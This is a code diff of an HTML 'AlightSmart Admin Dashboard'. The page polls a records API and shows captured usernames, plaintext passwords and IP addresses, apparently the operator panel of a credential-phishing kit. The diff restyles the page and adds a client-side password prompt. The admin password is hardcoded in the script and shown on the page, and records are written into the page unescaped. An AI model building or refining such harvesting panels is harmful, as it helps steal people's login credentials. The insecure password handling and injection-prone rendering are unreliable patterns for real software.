@@ -3,48 +3,71 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin</title>
+    <title>AlightSmart Admin</title>
     <style>
-        body { font-family: Arial; padding: 20px; background: #f0f0f0; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', sans-serif; background: #f8fafc; padding: 20px; }
+        .container { max-width: 1300px; margin: auto; background: white; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        .header { background: #1e40af; color: white; padding: 20px; text-align: center; }
         table { width: 100%; border-collapse: collapse; }
-        th, td { padding: 12px; border: 1px solid #ccc; }
-        th { background: #1e40af; color: white; }
+        th, td { padding: 14px; text-align: left; border-bottom: 1px solid #ddd; }
+        th { background: #e2e8f0; }
     </style>
 </head>
 <body>
-    <h1>AlightSmart Admin Dashboard</h1>
-    <p>Password: tunde6035</p>
-    <table id="table">
-        <thead>
-            <tr>
-                <th>Time</th>
-                <th>Type</th>
-                <th>Username</th>
-                <th>Password</th>
-                <th>IP</th>
-            </tr>
-        </thead>
-        <tbody></tbody>
-    </table>
+    <div class="container">
+        <div class="header">
+            <h1>🔐 AlightSmart Admin Dashboard</h1>
+            <p>Password: tunde6035</p>
+        </div>
+
+        <table id="recordsTable">
+            <thead>
+                <tr>
+                    <th>Time</th>
+                    <th>Type</th>
+                    <th>Username</th>
+                    <th>Password</th>
+                    <th>IP</th>
+                </tr>
+            </thead>
+            <tbody></tbody>
+        </table>
+    </div>
 
     <script>
+        const ADMIN_PASSWORD = "tunde6035";
+
         async function loadRecords() {
-            const res = await fetch('/api/records');
-            const records = await res.json();
-            const tbody = document.querySelector('#table tbody');
-            tbody.innerHTML = "";
-            records.forEach(r => {
-                tbody.innerHTML += `<tr>
-                    <td>${r.timestamp}</td>
-                    <td>${r.type}</td>
-                    <td>${r.username || '-'}</td>
-                    <td>${r.password ? r.password : '-'}</td>
-                    <td>${r.ip}</td>
-                </tr>`;
-            });
+            try {
+                const res = await fetch('/api/records');
+                const records = await res.json();
+                const tbody = document.querySelector('#recordsTable tbody');
+                tbody.innerHTML = "";
+
+                records.forEach(r => {
+                    tbody.innerHTML += `
+                        <tr>
+                            <td>${r.timestamp}</td>
+                            <td>${r.type}</td>
+                            <td><strong>${r.username || '-'}</strong></td>
+                            <td>${r.password ? `<code>${r.password}</code>` : '-'}</td>
+                            <td>${r.ip || '-'}</td>
+                        </tr>`;
+                });
+            } catch (e) {}
         }
-        setInterval(loadRecords, 3000);
-        window.onload = loadRecords;
+
+        window.onload = () => {
+            const pass = prompt("Enter Admin Password:");
+            if (pass === ADMIN_PASSWORD) {
+                loadRecords();
+                setInterval(loadRecords, 3000);
+            } else {
+                alert("Wrong Password");
+                window.location.href = "/";
+            }
+        };
     </script>
 </body>
 </html>
